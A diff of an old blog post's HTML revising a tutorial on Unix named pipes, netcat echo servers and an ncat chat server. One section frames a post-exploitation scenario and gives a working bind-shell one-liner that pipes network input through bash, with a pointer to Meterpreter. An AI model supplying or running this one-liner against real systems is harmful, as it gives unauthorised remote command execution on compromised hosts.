@@ -45,7 +45,7 @@
             </li>
             
             <li>
-                <a href="/about.html">About Me</a>
+                <a href="/about.html">About</a>
             </li>
             
         </ul>
@@ -57,69 +57,98 @@
             <h3>Fun With Pipes</h3>
             <time datetime="2014-10-06">06 Oct 2014</time>
         </div>
-        <h2>Pipes</h2>
-<p>Commonly, pipes are used in the shell to redirect the output of one process to the
-input of another, you simply</p>
+        <p>Quite a while back I came across some interesting applications of
+<strong>named pipes</strong> that I thought I should share with everybody. Blame
+the lack of attribution of sources on my memory.</p>
+<p>First, some background.</p>
+<h2>Pipes</h2>
+<p>Commonly, pipes are used in the shell to redirect the <code>stdout</code> of one
+process to the <code>stdin</code> of another, you simply</p>
 <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span class="nv">$ </span>cat myfile | grep sometext
 </pre></div>
 </td></tr></table>
 
 <h2>Named pipes</h2>
 <p>Since <code>|</code> pipes are anonymous, they cannot be referenced externally.
-Named pipes on the other hand are identifiable by a location in the
+Named pipes on the other hand have an accesible path in the
 filesystem.</p>
 <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span class="nv">$ </span>mkfifo /tmp/mypipe
 </pre></div>
 </td></tr></table>
 
-<p>The fact that they are referencable across shell commands leads to
-some very applications. Data can be pumped in by one
-command and fed to another command. Like,</p>
+<p>These pipes allow us to setup flows across different shell commands.
+Data can be pumped in by one command and fed to another command. Like,</p>
 <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span class="nv">$ </span>cat /tmp/mypipe
 </pre></div>
 </td></tr></table>
 
+<p>This command blocks till the named pipe spews and <code>EOF</code> marker.</p>
 <p>And in another shell,</p>
-<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span class="nv">$ </span><span class="nb">echo </span>hello &gt; /tmp/mypipe
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span class="nv">$ </span>cat &gt; /tmp/mypipe
 </pre></div>
 </td></tr></table>
 
-<p>Named pipes allow us to setup circular references in interesting
-applications.</p>
+<p>Now, whatever you type in the this shell should be visible in the
+other shell. Press <kbd>Ctrl-D</kbd> to exit.</p>
+<p>Named pipes are primarily used as IPC mechanisms along with UNIX
+sockets.</p>
+<p>Now let's get down to some interesting stuff. Since, these pipes are
+of interest to me because they allow us to set up a very special kind
+of circular reference. That is, <em>they allow a command's own output to
+be part of it's input!</em>.</p>
 <h2>Echo Server</h2>
 <p>Let's start of with something simple, an <strong>echo server</strong>. The
-principle is to simply <em>echo</em> the input of the user. The input is the
-output. The <a href="http://sectools.org/tool/netcat/">netcat</a> utility will
-help us setup a simple listening socket.</p>
+principle is to simply <em>echo</em> the input of the user. As have probably
+noticed, this falls directly into the category of problems the
+circular reference property of named pipes solves -- the input is the
+output.</p>
+<p>The <a href="http://sectools.org/tool/netcat/">netcat</a> utility helps us setup
+a simple listening socket that can be communicated with using <code>stdin</code>
+and <code>stdout</code>.</p>
 <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span class="nv">$ </span>cat /tmp/mypipe | nc -l 59000 &gt; /tmp/mypipe
 </pre></div>
 </td></tr></table>
 
-<p>Simply <code>cat</code>ing the contents of a pipe to the input of the
-<code>nc</code> command with the <code>-l</code> option that sets up a port to listen on and
-write any incoming data to the same pipe so that it's echoed back.</p>
-<p>There you have it, an echo server in <em>one line of bash</em></p>
+<p>Simply <code>cat</code>ing the contents of a pipe to the input of the <code>nc</code>
+command with the <code>-l</code> option that sets up a port to listen on and
+write any incoming data to the same pipe so that it's echoed
+back. Then,</p>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span class="nv">$ </span>nc &lt;network-address&gt; 59000
+</pre></div>
+</td></tr></table>
+
+<p>There you have it, an <em>echo server in one line of bash</em></p>
 <h2>Remote Shell</h2>
-<p>Now, something more interesting. Suppose, you have discovered a
-vulnerability in some service that allows you to execute a single
-command on the shell. Now you want to drop a shell on that box. What
-you gonna do? No worries, I got you covered.</p>
-<p>By slightly modifying the earlier snippet, we can set it up. Instead
-of simply echoing back the input, just pipe it through the bash
-interpreter.</p>
+<p>Suppose, you have discovered a vulnerability in some service that
+allows you to execute a single command on the shell. Now you want to
+drop a shell on that box. For something serious, you're probably
+better of using
+<a href="http://www.offensive-security.com/metasploit-unleashed/Meterpreter_Basics">Meterpreter</a>
+but this is for cases where you just need a simple, quick and dirty
+hack!</p>
+<p>Like the earlier snippet we set up a circular input path. The only
+difference being we pipe the user input through the bash interpreter
+that executes <code>stdin</code> and pipe it's <code>stdout</code> back to the network socket.</p>
 <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span class="nv">$ </span>cat /tmp/mypipe | bash | nc -l 59000 &gt; /tmp/mypipe
 </pre></div>
 </td></tr></table>
 
-<p>Boom! pWned!!</p>
+<p>Just connect to that port and you should have a working remote shell.</p>
 <h2>Chat Server</h2>
-<p>A chat server can be thought of as an echo server with multiple
-hosts. Sadly though, the netcat utility only allows only a single
-connection. Luckily, there's <a href="http://nmap.org/ncat/">this</a> tool that allows us to
-accept multiple incoming connections.</p>
+<p>A chat server is another application that falls into the same
+domain. It recieves some input and simply relays that input to all
+connected users. It can be thought of as an echo server with multiple
+concurrent nodes.</p>
+<p>Sadly though, the netcat utility only allows only a single active
+connection. Luckily, there's <a href="http://nmap.org/ncat/">this</a> rewrite of
+the netcat tool that allows us to accept multiple incoming connections
+simultaneously.</p>
 <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span class="nv">$ </span>cat /tmp/mypipe | ncat -l -k 59000 &gt; /tmp/mypipe
 </pre></div>
 </td></tr></table>
+
+<p>Now multiple hosts can connect to that port and exchange messages with
+each other.</p>
     </article>
 
     </div>
